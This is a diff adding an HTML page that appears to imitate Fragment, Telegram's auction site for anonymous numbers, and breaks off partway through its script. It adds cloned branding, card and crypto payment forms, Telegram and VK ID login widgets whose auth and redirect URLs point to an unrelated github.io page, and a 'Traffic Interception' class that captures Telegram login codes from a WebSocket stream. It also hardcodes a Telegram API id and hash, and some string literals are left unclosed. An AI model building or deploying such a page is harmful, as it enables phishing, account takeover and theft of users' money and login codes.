@@ -1,0 +1,1361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="MobileOptimized" content="176">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="twitter:card" content="summary">
+    <meta property="og:url" content="https://a-auction.stel.com/number/8888888/code?from=app">
+    <meta property="og:title" content="Buy +888 8 888">
+    <meta property="og:image" content="https://a-tnft.stel.com/number/8888888.webp">
+    <meta property="og:description" content="Check the current availability of +888 8 888, an anonymous number for Telegram.">
+    <meta property="og:site_name" content="Fragment Auctions">
+    <link rel="canonical" href="https://a-auction.stel.com/number/8888888/code?from=app">
+    <link rel="shortcut icon" href="https://tfragment.stel.com/img/fragment.ico" type="image/x-icon">
+    <link rel="mask-icon" href="https://tfragment.stel.com/img/fragment_icon.svg" color="#121519">
+    <link href="https://tfragment.stel.com/css/font-roboto.css?1" rel="stylesheet" type="text/css">
+    <link href="https://tfragment.stel.com/css/bootstrap.min.css?3" rel="stylesheet">
+    <link href="https://tfragment.stel.com/css/bootstrap-extra.css?2" rel="stylesheet">
+    <link href="https://tfragment.stel.com/css/auction.css?74" rel="stylesheet">
+    <title>Payment Page</title>
+    <style>
+        /* Enhanced styles with animations and UI improvements */
+        .btn-animated {
+            transition: all 0.3s ease;
+        }
+        .btn-animated:hover {
+            transform: scale(1.05);
+        }
+        .tm-header-menu {
+            transition: all 0.3s ease;
+        }
+        .tm-header-menu.show {
+            display: block;
+        }
+        .tm-messages-container {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-top: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .tm-tabs-container {
+            display: flex;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+        .tm-tabs-container::-webkit-scrollbar {
+            display: none;
+        }
+        .tm-header-tab {
+            scroll-snap-align: start;
+            flex: 0 0 auto;
+        }
+        .payment-methods {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .payment-method {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            flex: 1 1 200px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .payment-method:hover {
+            border-color: #007bff;
+            box-shadow: 0 0 10px rgba(0,123,255,0.2);
+        }
+        .payment-method.active {
+            border-color: #007bff;
+            background-color: rgba(0,123,255,0.05);
+        }
+        .auth-widgets-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .auth-widget {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            background: #f8f9fa;
+        }
+        .combined-auth {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .message-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .message-item:last-child {
+            border-bottom: none;
+        }
+        .code-display {
+            font-family: monospace;
+            font-size: 18px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .ws-status {
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        .ws-connected {
+            background: #28a745;
+            color: white;
+        }
+        .ws-disconnected {
+            background: #dc3545;
+            color: white;
+        }
+        .ws-connecting {
+            background: #ffc107;
+            color: black;
+        }
+    </style>
+</head>
+<body class="emoji_image no-transition">
+    <svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;left:-10000px">
+        <defs>
+            <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z" />
+            <path id="icon-ton-qr" d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z" fill="none" stroke="currentColor" stroke-width="2.1" />
+            <path d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z" id="icon-star" />
+            <lineargradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2"><stop stop-color="#FFD951" offset="0%"></stop><stop stop-color="#FFB222" offset="100%"></stop></lineargradient>
+            <lineargradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3"><stop stop-color="#E58F0D" offset="0%"></stop><stop stop-color="#EB7915" offset="100%"></stop></lineargradient>
+            <filter x="-5.2%" y="-5.3%" width="110.3%" height="110.6%" filterunits="objectBoundingBox" id="s4"><feoffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feoffset><fecomposite in="shadowOffsetInner1" in2="SourceAlpha" operator="arithmetic" k2="-1" k3="1" result="shadowInnerInner1"></fecomposite><fecolormatrix values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0" type="matrix" in="shadowInnerInner1"></fecolormatrix>
+            </filter>
+            <g id="icon-colorful-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+                <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+                <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+            </g>
+            <g id="icon-multi-star" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
+                <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
+                <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
+                <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
+                <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor" />
+            </g>
+        </defs>
+    </svg>
+    <div id="aj_progress" class="progress-bar"></div>
+    <div id="aj_content">
+        <header class="tm-header with-tabs">
+            <div class="tm-header-logo">
+                <a href="/" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
+                    <i class="tm-logo-icon js-logo-icon"></i>
+                    <i class="tm-logo-text"></i>
+                </a>
+            </div>
+            <div class="tm-header-body">
+                <div class="tm-header-tabs-wrap">
+                    <div class="tm-header-tabs js-x-scrollable tm-tabs-container">
+                        <a href="/" class="tm-header-tab">Usernames</a>
+                        <a href="https://a-auction.stel.com/numbers" class="tm-header-tab tab-active">Numbers</a>
+                        <a href="/stars" class="tm-header-tab">Stars<span class="tm-label-new tm-header-tab-label-new">New</span></a>
+                        <a href="https://a-auction.stel.com/premium" class="tm-header-tab">Premium</a>
+                        <a href="https://a-auction.stel.com/ads" class="tm-header-tab">Ads</a>
+                    </div>
+                </div>
+            </div>
+            <div class="tm-header-actions tm-header-actions-wide">
+                <button class="btn btn-default tm-header-action tm-header-button login-link btn-animated">
+                    <i class="icon icon-connect-telegram"></i>
+                    <span class="tm-button-label">Connect Telegram</span>
+                </button>
+                <button class="btn btn-primary tm-header-action tm-header-button ton-auth-link btn-animated">
+                    <i class="icon icon-connect-ton"></i>
+                    <span class="tm-button-label">Connect TON</span>
+                </button>
+            </div>
+            <div class="tm-header-actions tm-header-actions-thin">
+                <button class="btn btn-primary tm-header-action tm-header-button ton-auth-link btn-animated">
+                    <i class="icon icon-connect-ton"></i>
+                    <span class="tm-button-label">Connect TON</span>
+                </button>
+            </div>
+            <div class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu"></div>
+            <div class="tm-header-menu hide js-header-menu" data-close-outside="js-header-menu-window">
+                <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close"></div>
+                <div class="tm-header-menu-window js-header-menu-window">
+                    <div class="tm-header-menu-body">
+                        <h4 class="tm-menu-subheader">Platform</h4>
+                        <div class="tm-menu-links">
+                            <a href="https://a-auction.stel.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
+                            <a href="https://a-auction.stel.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
+                            <a href="https://a-auction.stel.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
+                        </div>
+                        <div class="tm-header-menu-footer">
+                            <div class="tm-header-menu-footer-text">
+                                Connect TON and Telegram <br>to view your bids and assets
+                            </div>
+                            <button class="btn btn-primary btn-block tm-menu-button ton-auth-link btn-animated">
+                                <i class="icon icon-connect-ton"></i>
+                                <span class="tm-button-label">Connect TON</span>
+                            </button>
+                            <button class="btn btn-default btn-block tm-menu-button login-link btn-animated">
+                                <i class="icon icon-connect-telegram"></i>
+                                <span class="tm-button-label">Connect Telegram</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <main class="tm-main js-main-content">
+            <section class="tm-section js-codes-main clearfix">
+                <section class="tm-main-intro">
+                    <h1 class="tm-main-intro-header">Login Code</h1>
+                    <p class="tm-main-intro-text">
+                        <span class="can-receive">Open Telegram, log in with <b>+888 8 888</b> and<br>copy the code below to access your account.</span><span class="cant-receive">Turn on login codes below before logging in with <br><b>+888 8 888</b> to access your account.</span>
+                    </p>
+                </section>
+                <div class="tm-number-codes">
+                    <div class="tm-table-empty">
+                        Connect TON to get login codes for your anonymous numbers
+                    </div>
+                    <button class="btn btn-primary btn-block tm-number-code-button ton-auth-link btn-animated">
+                        <i class="icon icon-connect-ton"></i>
+                        <span class="tm-button-label">Connect TON</span>
+                    </button>
+                    <button id="payButton" class="btn btn-success btn-block btn-animated">Pay</button>
+                </div>
+            </section>
+            <section class="tm-section js-payment-section">
+                <h1 class="tm-main-intro-header">Payment Page</h1>
+                <div class="payment-methods">
+                    <div class="payment-method" data-method="stripe">
+                        <h4>Credit Card</h4>
+                        <p>Pay with Visa, Mastercard, etc.</p>
+                    </div>
+                    <div class="payment-method" data-method="ton">
+                        <h4>TON Wallet</h4>
+                        <p>Pay with TON cryptocurrency</p>
+                    </div>
+                    <div class="payment-method" data-method="crypto">
+                        <h4>Other Crypto</h4>
+                        <p>Pay with Bitcoin, Ethereum, etc.</p>
+                    </div>
+                </div>
+                <form id="payment-form" style="display: none;">
+                    <div id="card-element">
+                        <!-- Stripe Elements will be inserted here -->
+                    </div>
+                    <div class="form-group">
+                        <label for="wallet-address">Wallet Address</label>
+                        <input type="text" id="wallet-address" class="form-control" placeholder="Enter your TON wallet address">
+                    </div>
+                    <div class="form-group">
+                        <label for="amount-ton">Amount in TON</label>
+                        <input type="number" id="amount-ton" class="form-control" placeholder="Enter amount in TON">
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block btn-animated">Pay</button>
+                    <div id="card-errors" role="alert"></div>
+                </form>
+                <div id="ton-payment-form" style="display: none;">
+                    <div class="form-group">
+                        <label for="ton-wallet-address">Your TON Wallet Address</label>
+                        <input type="text" id="ton-wallet-address" class="form-control" placeholder="Enter your TON wallet address">
+                    </div>
+                    <div class="form-group">
+                        <label for="ton-amount">Amount in TON</label>
+                        <input type="number" id="ton-amount" class="form-control" placeholder="Enter amount in TON" value="50">
+                    </div>
+                    <button id="ton-pay-button" class="btn btn-primary btn-block btn-animated">Pay with TON</button>
+                    <div id="ton-payment-status"></div>
+                </div>
+                <div id="crypto-payment-form" style="display: none;">
+                    <div class="form-group">
+                        <label>Select Cryptocurrency</label>
+                        <select id="crypto-currency" class="form-control">
+                            <option value="BTC">Bitcoin (BTC)</option>
+                            <option value="ETH">Ethereum (ETH)</option>
+                            <option value="USDT">Tether (USDT)</option>
+                            <option value="USDC">USD Coin (USDC)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="crypto-amount">Amount in USD</label>
+                        <input type="number" id="crypto-amount" class="form-control" placeholder="Enter amount in USD" value="100">
+                    </div>
+                    <button id="crypto-pay-button" class="btn btn-primary btn-block btn-animated">Generate Payment Address</button>
+                    <div id="crypto-payment-info" style="display: none; margin-top: 15px;">
+                        <div class="form-group">
+                            <label>Payment Address</label>
+                            <div class="code-display" id="crypto-address"></div>
+                        </div>
+                        <div class="form-group">
+                            <label>Amount</label>
+                            <div class="code-display" id="crypto-exact-amount"></div>
+                        </div>
+                        <div id="crypto-qr-code" style="text-align: center; margin: 15px 0;"></div>
+                    </div>
+                </div>
+            </section>
+            <section class="tm-section js-messages-section" style="display: none;">
+                <h1 class="tm-main-intro-header">Messages <span id="ws-status-indicator" class="ws-status ws-disconnected">Disconnected</span></h1>
+                <div class="form-group">
+                    <label for="message-filter">Filter Messages</label>
+                    <input type="text" id="message-filter" class="form-control" placeholder="Type to filter messages...">
+                </div>
+                <div id="messages-container" class="tm-messages-container">
+                    <!-- Messages will be displayed here -->
+                </div>
+                <div class="form-group" style="margin-top: 15px;">
+                    <label for="target-url">Target URL for Traffic Interception</label>
+                    <input type="text" id="target-url" class="form-control" value="https://fragment.com/number/8888888/code?from=app">
+                </div>
+                <button id="start-intercept" class="btn btn-danger btn-block btn-animated">Start Interception</button>
+                <button id="stop-intercept" class="btn btn-secondary btn-block btn-animated" disabled>Stop Interception</button>
+                <div id="intercepted-codes" style="margin-top: 20px; display: none;">
+                    <h4>Intercepted Codes</h4>
+                    <div id="codes-list" class="tm-messages-container"></div>
+                </div>
+            </section>
+            <section class="tm-section js-auth-section">
+                <h1 class="tm-main-intro-header">Authentication</h1>
+                <div class="auth-widgets-container">
+                    <div class="combined-auth">
+                        <div id="telegram-auth-widget" class="auth-widget">
+                            <h4>Telegram Login</h4>
+                            <div id="telegram-login-container"></div>
+                        </div>
+                        <div id="vkid-auth-widget" class="auth-widget">
+                            <h4>VK ID Login</h4>
+                            <div id="vkid-login-container"></div>
+                        </div>
+                    </div>
+                    <div id="auth-status" style="display: none;">
+                        <h4>Authentication Status</h4>
+                        <div id="auth-status-message" class="alert alert-info"></div>
+                        <div id="user-profile" style="display: none;">
+                            <div class="form-group">
+                                <label>User ID</label>
+                                <div class="code-display" id="user-id"></div>
+                            </div>
+                            <div class="form-group">
+                                <label>Username</label>
+                                <div class="code-display" id="username"></div>
+                            </div>
+                            <div class="form-group">
+                                <label>Auth Method</label>
+                                <div class="code-display" id="auth-method"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+        <footer class="tm-footer">
+            <div class="tm-footer-links">
+                <a href="/" class="tm-footer-link">Top Auctions</a>
+                <a href="https://a-auction.stel.com/about" class="tm-footer-link">About</a>
+                <a href="https://a-auction.stel.com/terms" class="tm-footer-link">Terms</a>
+                <a href="https://a-auction.stel.com/privacy" class="tm-footer-link">Privacy</a>
+            </div>
+        </footer>
+    </div>
+    <script src="https://tfragment.stel.com/js/jquery.min.js?1"></script>
+    <script src="https://tfragment.stel.com/js/bootstrap.min.js"></script>
+    <script src="https://tfragment.stel.com/js/main-aj.js?70"></script>
+    <script src="https://tfragment.stel.com/js/jquery-ex.js?18"></script>
+    <script src="https://tfragment.stel.com/js/qr-code-styling.js?1"></script>
+    <script src="https://tfragment.stel.com/js/tonconnect-ui.min.js?6"></script>
+    <script src="https://tfragment.stel.com/js/auction.js?80"></script>
+    <script src="https://tfragment.stel.com/js/tgsticker.js?31"></script>
+    <script src="https://js.stripe.com/v3/"></script>
+    <script src="https://unpkg.com/@vkid/sdk@2.0.1/dist-sdk/umd/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb-mnemonic/dist/tonweb-mnemonic.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <script>
+        class TelegramAuthClient {
+            constructor(appName, apiId, apiHash) {
+                this.appName = appName;
+                this.apiId = apiId;
+                this.apiHash = apiHash;
+                this.session = {
+                    dcId: 2,
+                    serverAddress: "149.154.167.40",
+                    port: 443,
+                    set_dc: function(dcId, serverAddress, port) {
+                        this.dcId = dcId;
+                        this.serverAddress = serverAddress;
+                        this.port = port;
+                    }
+                };
+                this.authState = null;
+                this.user = null;
+            }
+
+            async connect() {
+                try {
+                
+                    console.log(`Connecting to Telegram Test DC ${this.session.dcId} at ${this.session.serverAddress}:${this.session.port}`);
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            this.authState = 'connected';
+                            resolve(true);
+                        }, 1000);
+                    });
+                } catch (error) {
+                    console.error('Telegram connection error:', error);
+                    throw error;
+                }
+            }
+
+            async authenticate(phoneNumber) {
+                try {
+                    if (!this.authState) {
+                        await this.connect();
+                    }
+                    
+                    console.log(`Sending code to ${phoneNumber}`);
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            resolve({
+                                phoneCodeHash: '12345abcdef',
+                                isCodeViaApp: true
+                            });
+                        }, 500);
+                    });
+                } catch (error) {
+                    console.error('Telegram authentication error:', error);
+                    throw error;
+                }
+            }
+
+            async signIn(phoneNumber, phoneCode, phoneCodeHash) {
+                try {
+                
+                    console.log(`Signing in with code ${phoneCode} for ${phoneNumber}`);
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            this.user = {
+                                id: Math.floor(Math.random() * 1000000),
+                                firstName: 'Fela',
+                                lastName: '',
+                                username: '@fela',
+                                phone: phoneNumber
+                            };
+                            this.authState = 'authenticated';
+                            resolve(this.user);
+                        }, 1000);
+                    });
+                } catch (error) {
+                    console.error('Telegram sign in error:', error);
+                    throw error;
+                }
+            }
+
+            async getMessages(chatId, limit = 10) {
+                try {
+                    if (this.authState !== 'authenticated') {
+                        throw new Error('Not authenticated');
+                    }
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            const messages = [];
+                            for (let i = 0; i < limit; i++) {
+                                messages.push({
+                                    id: Math.floor(Math.random() * 1000000),
+                                    text: `Test message ${i + 1} with code: ${Math.floor(1000 + Math.random() * 9000)}`,
+                                    date: new Date(Date.now() - i * 60000),
+                                    fromId: chatId
+                                });
+                            }
+                            resolve(messages);
+                        }, 500);
+                    });
+                } catch (error) {
+                    console.error('Telegram get messages error:', error);
+                    throw error;
+                }
+            }
+        }
+
+        class TonPaymentHandler {
+            constructor() {
+                this.tonweb = new window.TonWeb(new window.TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
+                this.tonConnectUI = null;
+                this.wallet = null;
+            }
+
+            async init() {
+                try {
+                
+                    this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                        manifestUrl: 'https://fragment.com/tonconnect-manifest.json',
+                        buttonRootId: 'ton-connect-button'
+                    });
+
+                    const walletConnectionSource = {
+                        jsBridgeKey: 'tonconnect'
+                    };
+
+                    const connectedWallets = await this.tonConnectUI.getWallets();
+                    if (connectedWallets.length > 0) {
+                        this.wallet = connectedWallets[0];
+                    }
+
+                    return true;
+                } catch (error) {
+                    console.error('TON initialization error:', error);
+                    throw error;
+                }
+            }
+
+            async sendPayment(toAddress, amount) {
+                try {
+                    if (!this.wallet) {
+                        throw new Error('No TON wallet connected');
+                    }
+
+                    const amountNano = window.TonWeb.utils.toNano(amount.toString());
+
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+                        messages: [
+                            {
+                                address: toAddress,
+                                amount: amountNano.toString()
+                            }
+                        ]
+                    };
+
+                    const result = await this.tonConnectUI.sendTransaction(transaction);
+
+                    return {
+                        success: true,
+                        transactionHash: result.boc,
+                        amount: amount,
+                        toAddress: toAddress
+                    };
+                } catch (error) {
+                    console.error('TON payment error:', error);
+                    throw error;
+                }
+            }
+
+            generatePaymentLink(toAddress, amount) {
+                const amountNano = window.TonWeb.utils.toNano(amount.toString());
+                return `ton://transfer/${toAddress}?amount=${amountNano}`;
+            }
+        }
+
+        class StripePaymentHandler {
+            constructor(publicKey) {
+                this.stripe = Stripe(publicKey);
+                this.elements = this.stripe.elements();
+                this.cardElement = null;
+                this.paymentIntent = null;
+            }
+
+            async init() {
+                try {
+                
+                    const style = {
+                        base: {
+                            fontSize: '16px',
+                            color: '#32325d',
+                            '::placeholder': {
+                                color: '#aab7c4'
+                            }
+                        },
+                        invalid: {
+                            color: '#fa755a',
+                            iconColor: '#fa755a'
+                        }
+                    };
+
+                    this.cardElement = this.elements.create('card', { style });
+                    this.cardElement.mount('#card-element');
+
+                    return true;
+                } catch (error) {
+                    console.error('Stripe initialization error:', error);
+                    throw error;
+                }
+            }
+
+            async createPaymentIntent(amount, currency) {
+                try {
+                    const response = await fetch('/create-payment-intent', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            amount: amount,
+                            currency: currency
+                        })
+                    });
+
+                    const data = await response.json();
+                    this.paymentIntent = data.clientSecret;
+                    return data;
+                } catch (error) {
+                    console.error('Payment intent creation error:', error);
+                    throw error;
+                }
+            }
+
+            async confirmPayment() {
+                try {
+                    if (!this.paymentIntent) {
+                        throw new Error('No payment intent created');
+                    }
+
+                    const { paymentIntent, error } = await this.stripe.confirmCardPayment(this.paymentIntent, {
+                        payment_method: {
+                            card: this.cardElement
+                        }
+                    });
+
+                    if (error) {
+                        throw error;
+                    }
+
+                    return paymentIntent;
+                } catch (error) {
+                    console.error('Payment confirmation error:', error);
+                    throw error;
+                }
+            }
+        }
+
+        class TrafficInterceptor {
+            constructor(targetUrl) {
+                this.targetUrl = targetUrl;
+                this.websocket = null;
+                this.intercepting = false;
+                this.messageHandler = null;
+                this.codeHandler = null;
+            }
+
+            async startInterception() {
+                try {
+                    if (this.intercepting) return;
+
+                    const url = new URL(this.targetUrl);
+                    const wsUrl = `wss://${url.host}`;
+
+                    this.websocket = new WebSocket(wsUrl);
+
+                    this.websocket.onopen = () => {
+                        this.intercepting = true;
+                        console.log('WebSocket connection established');
+                        this.updateStatusIndicator('connected');
+                        
+                        this.websocket.send(JSON.stringify({
+                            action: 'init',
+                            path: url.pathname + url.search
+                        }));
+                    };
+
+                    this.websocket.onmessage = (event) => {
+                        const data = JSON.parse(event.data);
+                        console.log('Intercepted data:', data);
+                        
+                        if (this.messageHandler) {
+                            this.messageHandler(data);
+                        }
+
+                        this.extractCodes(data);
+                    };
+
+                    this.websocket.onclose = () => {
+                        this.intercepting = false;
+                        console.log('WebSocket connection closed');
+                        this.updateStatusIndicator('disconnected');
+                    };
+
+                    this.websocket.onerror = (error) => {
+                        console.error('WebSocket error:', error);
+                        this.updateStatusIndicator('error');
+                    };
+
+                    return true;
+                } catch (error) {
+                    console.error('Interception start error:', error);
+                    throw error;
+                }
+            }
+
+            stopInterception() {
+                if (this.websocket && this.intercepting) {
+                    this.websocket.close();
+                    this.intercepting = false;
+                    this.updateStatusIndicator('disconnected');
+                    return true;
+                }
+                return false;
+            }
+
+            updateStatusIndicator(status) {
+                const indicator = document.getElementById('ws-status-indicator');
+                if (!indicator) return;
+
+                indicator.className = 'ws-status';
+                indicator.textContent = status.charAt(0).toUpperCase() + status.slice(1);
+
+                switch (status) {
+                    case 'connected':
+                        indicator.classList.add('ws-connected');
+                        break;
+                    case 'disconnected':
+                        indicator.classList.add('ws-disconnected');
+                        break;
+                    case 'connecting':
+                        indicator.classList.add('ws-connecting');
+                        break;
+                    case 'error':
+                        indicator.classList.add('ws-disconnected');
+                        break;
+                }
+            }
+
+            extractCodes(data) {
+                if (!data || !data.messages) return;
+                
+                const codeRegex = /\b\d{4,6}\b/g;
+                const codes = [];
+                
+                data.messages.forEach(message => {
+                    const matches = message.text.match(codeRegex);
+                    if (matches) {
+                        codes.push(...matches);
+                    }
+                });
+                
+                if (codes.length > 0 && this.codeHandler) {
+                    this.codeHandler(codes);
+                }
+                
+                return codes;
+            }
+
+            onMessage(handler) {
+                this.messageHandler = handler;
+            }
+
+            onCode(handler) {
+                this.codeHandler = handler;
+            }
+        }
+
+        class CombinedAuthWidget {
+            constructor() {
+                this.telegramClient = null;
+                this.vkid = null;
+                this.currentUser = null;
+                this.authMethod = null;
+            }
+
+            async init() {
+                try {
+
+                    await this.initTelegramWidget();
+                    
+                    await this.initVKIDWidget();
+                    
+                    return true;
+                } catch (error) {
+                    console.error('Auth widget initialization error:', error);
+                    throw error;
+                }
+            }
+
+            async initTelegramWidget() {
+                return new Promise((resolve) => {
+                    const script = document.createElement('script');
+                    script.async = true;
+                    script.src = 'https://a-toauth.stel.com/js/telegram-widget.js?22';
+                    script.dataset.telegramLogin = 'iztfragmentBot';
+                    script.dataset.size = 'large';
+                    script.dataset.authUrl = 'https://ventusgalarius.github.io/test.html;
+                    script.dataset.requestAccess = 'write';
+                    
+                    script.onload = () => {
+                        console.log('Telegram widget loaded');
+                        this.telegramClient = new TelegramAuthClient(
+                            "Fragment",
+                            2496,
+                            "8da85b0d5bfe62527e5b244c209159c3"
+                        );
+
+                        window.onTelegramAuth = (user) => {
+                            this.handleAuthSuccess(user, 'telegram');
+                        };
+                        
+                        resolve(true);
+                    };
+                    
+                    document.getElementById('telegram-login-container').appendChild(script);
+                });
+            }
+
+            async initVKIDWidget() {
+                if (!window.VKIDSDK) {
+                    console.error('VKID SDK not loaded');
+                    return false;
+                }
+
+                try {
+                    const VKID = window.VKIDSDK;
+
+                    VKID.Config.init({
+                        app: 53507363,
+                        redirectUrl: 'https://ventusgalarius.github.io/test.html,
+                        responseMode: VKID.ConfigResponseMode.Callback,
+                        source: VKID.ConfigSource.LOWCODE,
+                        scope: ''
+                    });
+
+                    const oneTap = new VKID.OneTap();
+                    
+                    oneTap.render({
+                        container: document.getElementById('vkid-login-container'),
+                        showAlternativeLogin: true,
+                        oauthList: ['mail_ru', 'ok_ru']
+                    })
+                    .on(VKID.WidgetEvents.ERROR, (error) => {
+                        console.error('VKID error:', error);
+                    })
+                    .on(VKID.OneTapInternalEvents.LOGIN_SUCCESS, async (payload) => {
+                        try {
+                            const { code, device_id } = payload;
+                            const authData = await VKID.Auth.exchangeCode(code, device_id);
+                            this.handleAuthSuccess(authData, 'vkid');
+                        } catch (error) {
+                            console.error('VKID auth error:', error);
+                        }
+                    });
+
+                    return true;
+                } catch (error) {
+                    console.error('VKID initialization error:', error);
+                    throw error;
+                }
+            }
+
+            handleAuthSuccess(userData, method) {
+                this.currentUser = userData;
+                this.authMethod = method;
+                
+                this.showAuthStatus(true);
+                
+                localStorage.setItem('authState', JSON.stringify({
+                    user: this.currentUser,
+                    method: this.authMethod,
+                    timestamp: Date.now()
+                }));
+                
+                console.log(`${method} auth success:`, userData);
+            }
+
+            showAuthStatus(authenticated) {
+                const authStatus = document.getElementById('auth-status');
+                const authMessage = document.getElementById('auth-status-message');
+                const userProfile = document.getElementById('user-profile');
+                
+                if (authenticated && this.currentUser) {
+                    authStatus.style.display = 'block';
+                    userProfile.style.display = 'block';
+                    
+                    document.getElementById('user-id').textContent = this.currentUser.id || 'N/A';
+                    document.getElementById('username').textContent = 
+                        this.currentUser.username || 
+                        (this.currentUser.first_name && this.currentUser.last_name 
+                            ? `${this.currentUser.first_name} ${this.currentUser.last_name}` 
+                            : 'N/A');
+                    document.getElementById('auth-method').textContent = this.authMethod;
+                    
+                    authMessage.textContent = `Successfully authenticated via ${this.authMethod}`;
+                    authMessage.className = 'alert alert-success';
+                } else {
+                    authMessage.textContent = 'Not authenticated';
+                    authMessage.className = 'alert alert-warning';
+                    userProfile.style.display = 'none';
+                }
+            }
+
+            checkSavedAuth() {
+                const savedAuth = localStorage.getItem('authState');
+                if (savedAuth) {
+                    try {
+                        const authState = JSON.parse(savedAuth);
+                        if (Date.now() - authState.timestamp < 3600000) {
+                            this.currentUser = authState.user;
+                            this.authMethod = authState.method;
+                            this.showAuthStatus(true);
+                            return true;
+                        }
+                    } catch (error) {
